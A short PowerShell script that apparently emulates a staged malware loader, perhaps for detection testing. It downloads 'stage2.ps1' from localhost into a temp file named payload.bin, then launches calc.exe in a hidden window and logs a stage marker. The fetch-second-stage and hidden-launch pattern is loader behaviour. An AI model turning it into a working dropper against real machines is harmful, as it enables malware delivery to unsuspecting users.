
[CmdletBinding()]
param(
    [string]$DownloadUrl = "https://localhost:8080/stage2.ps1",
    [string]$LocalPath = "$env:TEMP\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $LocalPath)
Start-Process -FilePath 'calc.exe' -WindowStyle Hidden
Write-Verbose "stage marker 40 reached"
